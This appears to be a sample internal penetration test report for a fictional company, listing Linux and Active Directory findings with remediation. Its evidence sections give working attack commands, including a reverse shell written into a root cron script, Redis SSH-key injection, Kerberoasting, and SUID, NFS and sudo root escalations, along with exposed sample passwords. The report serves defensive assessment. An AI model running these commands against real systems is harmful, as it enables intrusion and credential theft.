Section 1

Executive Summary

My Cyber Academy conducted an internal grey box penetration test against two servers within the Syntex Solutions Ltd infrastructure between 4 and 8 November 2024. The engagement was commissioned to satisfy PCI DSS v4.0 Requirement 11.4 and to assess the security posture of the company's server infrastructure ahead of an annual compliance audit.

The testing identified 18 findings across the two in-scope systems, including three critical vulnerabilities that would allow an attacker to gain complete control of both servers and access sensitive financial data without requiring advanced technical capability.

Board-Level Summary: An attacker with access to the Syntex internal network - whether a malicious insider, a contractor, or an external attacker who has compromised a single endpoint - could gain full administrative control of both servers within minutes. Sensitive financial data, employee credentials, and customer records are exposed. Immediate remediation of the three critical findings is recommended before the PCI DSS audit proceeds.

Section 4

Critical Findings

LNX-01 Critical World-Writable Root Cron Job - Local Privilege Escalation
9.8
AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
SYNTEX-LNX01
Req 6.3, 7.2

Description

A shell script executed by root's crontab every minute is world-writable (permissions 777). Any authenticated local user can overwrite the script with arbitrary commands that will be executed as root at the next cron execution - typically within 60 seconds.

Evidence

# Identify world-writable files referenced in crontab
cat /etc/crontab
# Output: * * * * * root /opt/syntex_maintenance.sh

ls -la /opt/syntex_maintenance.sh
# Output: -rwxrwxrwx 1 root root 142 Nov 4 09:31 /opt/syntex_maintenance.sh

# Exploit: overwrite script with reverse shell
echo 'bash -i >& /dev/tcp/10.1.221.204/4444 0>&1' > /opt/syntex_maintenance.sh

# Wait up to 60 seconds - receive root shell on attacker machine
nc -lvnp 4444
# Connection received from 10.1.53.39
# root@syntex-lnx01:/# id
# uid=0(root) gid=0(root) groups=0(root)

Business Impact

Full root compromise of SYNTEX-LNX01. An attacker with any valid local account can escalate to root within 60 seconds. All data on the server - including database credentials, financial records, and customer data - would be accessible. The attacker could use this access as a pivot point to further attack internal infrastructure.

Remediation

  • Immediately restrict permissions on /opt/syntex_maintenance.sh: chmod 700 /opt/syntex_maintenance.sh; chown root:root /opt/syntex_maintenance.sh
  • Audit all files referenced in /etc/cron* for world-writable permissions
  • Implement a file integrity monitoring solution to alert on changes to cron-executed scripts
  • Apply principle of least privilege to all cron jobs
LNX-02 Critical Redis Unauthenticated Remote Access - Remote Code Execution
9.8
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
SYNTEX-LNX01
6379/TCP

Description

Redis is running on port 6379 bound to all interfaces (0.0.0.0) with no authentication configured and protected-mode disabled. Redis provides a CONFIG SET command that can be used to write arbitrary files to the filesystem, enabling an unauthenticated remote attacker to write an SSH public key to the root user's authorized_keys file and gain direct root SSH access.

Evidence

# Connect to Redis from Kali - no credentials required
redis-cli -h 10.1.53.39 -p 6379

# Confirm unauthenticated access
10.1.53.39:6379> INFO server
# redis_version:6.0.16

# Write SSH key via Redis CONFIG SET (RCE technique)
10.1.53.39:6379> CONFIG SET dir /root/.ssh
10.1.53.39:6379> CONFIG SET dbfilename authorized_keys
10.1.53.39:6379> SET payload "\n\nssh-rsa AAAAB3Nza...attacker_key...\n\n"
10.1.53.39:6379> BGSAVE

# SSH in as root
ssh -i attacker_key root@10.1.53.39
# root@syntex-lnx01:~# id
# uid=0(root) gid=0(root) groups=0(root)

Business Impact

Unauthenticated remote root access to SYNTEX-LNX01 without requiring any credentials. This is exploitable by any host that can reach port 6379. Given Redis is bound to all interfaces, this attack is available from anywhere on the internal network. PCI DSS cardholder data stored on or accessible from this server would be compromised.

Remediation

  • Immediately bind Redis to localhost only: set bind 127.0.0.1 in /etc/redis/redis.conf
  • Enable authentication: set requirepass <strong-password>
  • Enable protected-mode: set protected-mode yes
  • Firewall port 6379 from all external access using UFW or iptables
  • Review Redis documentation: Redis is designed as a trusted internal service and should never be internet or network exposed without authentication
WIN-01 Critical Kerberoasting - Weak Service Account SPNs
9.1
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
SYNTEX-DC01
Req 8.3

Description

Multiple Active Directory service accounts have Service Principal Names (SPNs) registered and use weak passwords. Any authenticated domain user can request Kerberos TGS tickets for these accounts and attempt to crack them offline. No lockout policy applies to offline cracking attempts.

Evidence

# Request Kerberoastable hashes using Impacket (from Kali with domain creds)
GetUserSPNs.py syntex.local/jsmith:Password1 -dc-ip 10.0.29.131 -request

# Output (hashes cracked offline with hashcat):
$krb5tgs$23$*svc-mssql$SYNTEX.LOCAL$MSSQLSvc/syntex-dc01.syntex.local:1433*$...
# hashcat -m 13100 hash.txt rockyou.txt
# Cracked: svc-mssql : Mssql2024!

$krb5tgs$23$*svc-backup$SYNTEX.LOCAL$BackupService/syntex-dc01.syntex.local*$...
# Cracked: svc-backup : Backup123

Business Impact

Two service account passwords were recovered in under 10 minutes using standard wordlist attacks. Service accounts in Active Directory environments frequently have elevated permissions. Compromise of svc-mssql directly enables database access. Domain escalation paths exist from these accounts.

Remediation

  • Implement Group Managed Service Accounts (gMSA) which use automatically rotated, cryptographically complex passwords
  • Where gMSA is not possible, enforce password length of 25+ characters for service accounts
  • Remove unnecessary SPNs from service accounts that do not require Kerberos authentication
  • Enable AES-only encryption for Kerberos tickets (removes RC4 downgrade attack surface)
  • Monitor for bulk TGS ticket requests using Windows Event ID 4769

High Findings - Windows (WIN-02 to WIN-04)

WIN-02 High AS-REP Roasting - Kerberos Pre-Authentication Disabled
8.8
SYNTEX-DC01
Req 8.3
N/A - Misconfiguration

Description

User accounts have Kerberos pre-authentication disabled (DONT_REQ_PREAUTH flag set). This allows an unauthenticated attacker to request an AS-REP response for these accounts and crack the resulting hash offline to recover plaintext passwords.

Evidence

GetNPUsers.py syntex.local/ -usersfile users.txt -no-pass -dc-ip 10.0.29.131
# $krb5asrep$23$svc-noauth@SYNTEX.LOCAL:...
# hashcat -m 18200: svc-noauth : NoAuth2024!

Remediation

  • Enable Kerberos pre-authentication on all user accounts unless there is a specific technical requirement
  • Search for accounts with DONT_REQ_PREAUTH: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
  • Enforce strong passwords on any account that cannot enable pre-auth
WIN-03 High SMBv1 Enabled - EternalBlue Attack Surface
8.1
SYNTEX-DC01
CVE-2017-0144
Req 6.3

Description

SMBv1 is enabled on the domain controller. While MS17-010 (EternalBlue) requires the system to be unpatched, the presence of SMBv1 exposes the server to credential relay attacks, null session enumeration, and legacy protocol vulnerabilities. SMBv1 has been deprecated by Microsoft and should not be in use on any modern system.

Evidence

nmap -p 445 --script smb-protocols 10.0.29.131
# SMBv1 is enabled

Remediation

  • Disable SMBv1 immediately: Set-SmbServerConfiguration -EnableSMB1Protocol $false
  • Verify no legacy systems require SMBv1 before disabling
  • Enforce SMB signing to prevent relay attacks on SMBv2/3
WIN-04 High DNS Zone Transfer (AXFR) Open to Any Host
7.5
SYNTEX-DC01
53/TCP
Req 1.3

Description

The DNS server on SYNTEX-DC01 is configured to allow zone transfers to any requesting host. A zone transfer returns the complete contents of the DNS zone, enumerating all hostnames, IP addresses, and TXT records - providing an attacker with a complete map of internal infrastructure.

Evidence

dig axfr syntex.local @10.0.29.131
# syntex.local SOA syntex-dc01.syntex.local.
# mail.syntex.local A 10.1.0.20
# vpn.syntex.local A 10.1.0.30
# db.syntex.local A 10.1.0.60
# admin.syntex.local A 10.1.0.80
# _note.syntex.local TXT "temp admin creds - see svc-backup share on DC"
The TXT record "_note.syntex.local" contains a credential breadcrumb pointing to a share containing administrative credentials. This significantly elevates the risk of the AXFR misconfiguration.

Remediation

  • Restrict zone transfers to authorised secondary DNS servers only
  • Remove all TXT records containing sensitive information immediately
  • Audit all DNS records for sensitive data before restricting AXFR

High Findings - Linux (LNX-03 to LNX-06)

LNX-03 High SUID Binary - Arbitrary Command Execution as Root
7.8
SYNTEX-LNX01
/usr/local/bin/syntex-backup
Req 6.3

Description

A custom backup binary has the SUID bit set and accepts a user-supplied argument that is passed directly to system() after calling setuid(0). Any local user can pass arbitrary shell commands as an argument to execute them as root.

Evidence

find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/syntex-backup

/usr/local/bin/syntex-backup "/bin/bash -p"
# bash-5.0# id
# uid=0(root) gid=0(root)

Remediation

  • Remove the SUID bit: chmod u-s /usr/local/bin/syntex-backup
  • Rewrite the binary to not accept user-supplied command arguments
  • Audit all SUID binaries: find / -perm -4000 -type f 2>/dev/null
LNX-04 High SSH Root Login Permitted with Password Authentication
7.5
SYNTEX-LNX01
22/TCP
Req 8.2

Description

SSH is configured to allow direct root login using password authentication. This means an attacker who obtains or brute-forces the root password can gain immediate administrative access. The root password (Syntex2024!) was identified in a credential file on the FTP server.

Evidence

grep "PermitRootLogin" /etc/ssh/sshd_config
# PermitRootLogin yes

# Using credentials found in /var/ftp/private/db_credentials.txt:
ssh root@10.1.53.39
# Password: Syntex2024!
# root@syntex-lnx01:~#

Remediation

  • Set PermitRootLogin no in /etc/ssh/sshd_config
  • Require sudo for administrative access from named admin accounts
  • Enforce SSH key-based authentication and disable password auth where possible
  • Change root password immediately
LNX-05 High NFS Exports Configured with no_root_squash
7.5
SYNTEX-LNX01
2049/TCP
Req 7.2

Description

NFS exports including /home are configured with no_root_squash and world-readable access. The no_root_squash option means root on the connecting client is treated as root on the NFS server. An attacker can mount the share, place a SUID shell binary, and execute it from the server to gain root.

Evidence

cat /etc/exports
# /home *(rw,sync,no_subtree_check,no_root_squash,insecure)

# From attacker machine (as root):
mount -t nfs 10.1.53.39:/home /tmp/nfsmount
cp /bin/bash /tmp/nfsmount/pwn
chmod u+s /tmp/nfsmount/pwn

# From SYNTEX-LNX01 as low-priv user:
/home/pwn -p
# root@syntex-lnx01:~#

Remediation

  • Add root_squash to all NFS exports
  • Restrict exports to specific trusted IP addresses, not wildcard *
  • Remove /home from NFS exports entirely unless operationally required
LNX-06 High Sudo NOPASSWD Misconfiguration - Privilege Escalation via find/vim/python3
7.8
SYNTEX-LNX01
Req 7.2
GTFOBins

Description

Multiple accounts are configured with NOPASSWD sudo entries for binaries that can trivially be used to spawn a root shell (find, vim, python3). GTFOBins documents exploitation of all three.

Evidence

sudo -l -U jsmith
# (ALL) NOPASSWD: /usr/bin/find
# (ALL) NOPASSWD: /usr/bin/vim

# Exploit via find:
sudo find . -exec /bin/bash \; -quit
# root@syntex-lnx01:#

# Exploit via python3 (guest account):
sudo python3 -c 'import os; os.system("/bin/bash")'

Remediation

  • Remove all NOPASSWD sudo entries for file editors, interpreters, and search tools
  • Audit sudoers: grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/
  • Apply principle of least privilege - grant sudo only for specific administrative tasks that require it
  • Reference GTFOBins (gtfobins.github.io) when evaluating any sudo permission
Section 7

Medium Findings

LNX-07 Medium MySQL Remote Root Access - Listening on All Interfaces
6.5
SYNTEX-LNX01
3306/TCP
Req 6.3, 7.2

Description

MySQL is bound to all network interfaces and the root account is accessible remotely with a weak password. The syntexdb database contains an employee table with plaintext passwords for all staff accounts.

Evidence

mysql -u root -pSyntex2024! -h 10.1.53.39 -e "SELECT * FROM syntexdb.employees;"
# jsmith | Password1 | IT Engineer
# mwebb  | Welcome1  | Finance Analyst
# admin  | Syntex@Admin1 | Administrator

Remediation

Bind MySQL to 127.0.0.1 only. Remove remote root access. Use application-specific accounts with minimum required permissions. Never store plaintext passwords - use bcrypt or Argon2 hashing.

LNX-08 Medium SNMP Public Community String - Infrastructure Enumeration
6.5
SYNTEX-LNX01
161/UDP
Req 1.3

Description

SNMP v1/v2c is running with the default community string "public" (read) and "private" (read/write). SNMP exposes detailed system information including running processes, installed software, network interfaces, and routing tables.

Evidence

snmpwalk -c public -v1 10.1.53.39
# System: syntex-lnx01, Syntex Solutions Server Room, Manchester
# Running processes, network interfaces, routing table all returned

Remediation

Disable SNMP v1/v2c. If SNMP monitoring is required, use SNMPv3 with authentication and encryption (authPriv). Use strong, unique community strings. Restrict SNMP access to monitoring hosts only via ACL.

LNX-09 Medium FTP Anonymous Access - Credential File Exposure
6.5
SYNTEX-LNX01
21/TCP
Req 8.2

Description

FTP allows anonymous login and unauthenticated read/write access. A file in /var/ftp/private/db_credentials.txt contains database connection strings including the root MySQL password and the Windows domain SQL Server sa account password in plaintext.

Evidence

ftp 10.1.53.39
# Connected. Name: anonymous, Password: (blank)
# 230 Login successful.
get private/db_credentials.txt
# DB: syntex_app / AppPass2024!
# MSSQL sa / Syntex2024!

Remediation

Disable anonymous FTP access. Remove credential files from any FTP-accessible location. Consider replacing FTP with SFTP entirely. Rotate all credentials exposed in this file immediately.

LNX-10 Medium Weak SSL/TLS Configuration - Legacy Protocol Support
5.9
SYNTEX-LNX01
443/TCP
Req 4.2

Description

The HTTPS service uses a self-signed SHA1 certificate with a 1024-bit RSA key (both deprecated), supports TLS 1.0/SSL 3.0 (deprecated and vulnerable to POODLE/BEAST), and enables weak cipher suites including RC4 and 3DES.

Remediation

Replace the certificate with a minimum 2048-bit RSA or 256-bit ECDSA certificate from a trusted CA. Disable TLS 1.0, 1.1 and SSL 3.0. Configure only TLS 1.2 and 1.3. Remove RC4, 3DES, and export cipher suites. PCI DSS Req 4.2 explicitly prohibits TLS 1.0 for cardholder data transmission.

WIN-05 Medium MSSQL xp_cmdshell Enabled - OS Command Execution via SQL
6.6
SYNTEX-DC01
1433/TCP
Req 6.3

Description

SQL Server has xp_cmdshell enabled, which allows OS-level commands to be executed from within SQL queries. Combined with the sa account credentials recovered via FTP, an attacker can achieve OS command execution on the domain controller.

Evidence

sqsh -S 10.0.29.131 -U sa -P Syntex2024!
# EXEC xp_cmdshell 'whoami'
# nt authority\system

Remediation

Disable xp_cmdshell: EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;. Disable it at the policy level. Rotate the sa account password and restrict access to SQL Server to application service accounts only.

LNX-11 Medium Telnet Service Running - Cleartext Protocol
5.3
SYNTEX-LNX01
23/TCP
Req 4.2

Description

Telnet transmits all data including credentials in cleartext. Any attacker with network access can perform passive interception of Telnet sessions to capture usernames and passwords. PCI DSS explicitly prohibits cleartext protocols for administrative access.

Remediation

Disable telnet immediately: systemctl disable telnetd. Use SSH for all remote access. If legacy systems require Telnet, isolate them to a separate VLAN and implement compensating controls.

Section 8

Low / Informational Findings

LNX-12 Low World-Readable /etc/shadow Backup File
4.0
SYNTEX-LNX01
/etc/shadow.bak
Req 8.3

Description

A backup copy of /etc/shadow exists at /etc/shadow.bak with world-readable permissions (644). The shadow file contains hashed passwords for all system accounts. An attacker with any local access can read these hashes and attempt offline cracking.

Evidence

ls -la /etc/shadow.bak
# -rw-r--r-- 1 root root 1234 Nov 4 09:11 /etc/shadow.bak
cat /etc/shadow.bak | grep root
# root:$6$...hashcat recovers: Syntex2024!

Remediation

Delete /etc/shadow.bak immediately. Set permissions on /etc/shadow to 640 root:shadow. Implement a process to identify and remove unprotected backup files containing sensitive data.

LNX-13 Low Apache Directory Listing Enabled - Backup Files Exposed
3.7
SYNTEX-LNX01
80/TCP
Req 6.3

Description

Apache directory listing is enabled on the web server. Browsing to /backup/ reveals a configuration backup file containing database credentials and an AWS API key (likely invalid test key, but indicative of poor secrets management practice).

Evidence

curl http://10.1.53.39/backup/
# Index of /backup/
# config.bak  - DB_PASS=AppPass2024!, AWS_KEY=AKIAIOSFODNN7EXAMPLE

Remediation

Disable directory listing: set Options -Indexes in Apache configuration. Remove backup and configuration files from the web root. Implement a process to prevent secrets from being stored in web-accessible directories. Use a secrets management solution (HashiCorp Vault, AWS Secrets Manager) for credential storage.
